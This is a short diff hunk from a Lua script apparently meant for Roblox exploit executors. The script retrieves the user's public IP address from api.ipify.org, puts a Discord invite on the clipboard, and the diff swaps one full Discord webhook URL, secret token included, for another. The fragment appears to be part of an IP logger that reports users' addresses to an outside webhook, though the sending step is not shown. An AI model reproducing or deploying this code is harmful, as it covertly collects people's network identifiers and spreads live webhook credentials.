@@ -319,7 +319,7 @@ local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 
 setclipboard("https://discord.com/invite/JN6wgVrUAr")
 
-local DiscordWebhook = "https://discord.com/api/webhooks/1039981571819704340/iCj8amiNA2Ys97uL3r0Zu_dKDA4BKtbvmuH75f4TSTFC2OBsvXvzPeeG9Sj3-zsmEHTM" -- Discord Webhook Here
+local DiscordWebhook = "https://discord.com/api/webhooks/1039981631395606609/DNKvhlU4d1Bwt0EQM6qnTc5x_7KNhNl0S6V0wyPqDuGH-Nrf1mEi7vwOPrTMAvJOGxKZ" -- Discord Webhook Here
 getgenv().embedcolor = "0x8cf4ff"
 
 setclipboard("https://discord.com/invite/JN6wgVrUAr")
